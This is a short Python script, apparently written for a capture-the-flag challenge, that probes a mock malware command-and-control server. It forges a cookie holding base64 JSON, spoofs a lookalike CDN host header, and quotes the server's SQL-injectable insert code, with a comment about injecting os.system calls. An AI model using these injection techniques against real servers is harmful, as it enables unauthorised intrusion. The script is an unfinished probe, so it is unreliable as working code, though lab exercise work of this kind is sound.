import requests
import webbrowser
import base64

MAL_FILE = '/assets/jquery-3.6.0.slim.min.js'
INSTANCE = 'http://206.189.117.48:32458'

HEADERS = {
'Host': 'cdnjs.cloudflair.co',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',
'Accept-Encoding': 'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'Accept-Language': 'en-US,en;q=0.5',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'cross-site',
'Cookie': '__cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid="' + base64.b64encode(b'{"output":"3*3432","id":"979"}').decode() + '";',
'Content-Length': '0'
}

# __cfuid format: b64({"output":...,"id":...})

#     def saveTaskResp(self, id, output):
#        with Database() as db:
#            db.execute(f"""INSERT INTO task_outputs(output, task_id) VALUES ('{output}', {id})""")
#        self.complete_task(id)

# the way of exploiting the c2 is probably passing __import__('os').system as the output

session = requests.Session()
session.headers = HEADERS
r = session.post(INSTANCE + MAL_FILE)
print(r.text)
with open('res.html', 'w') as html:
    html.write(r.text)

webbrowser.open('res.html')
print('openned')

# taskDATA = json.loads(rec_b64(unquote_plus(botDATA)))
# bot.saveTaskResp(**taskDATA)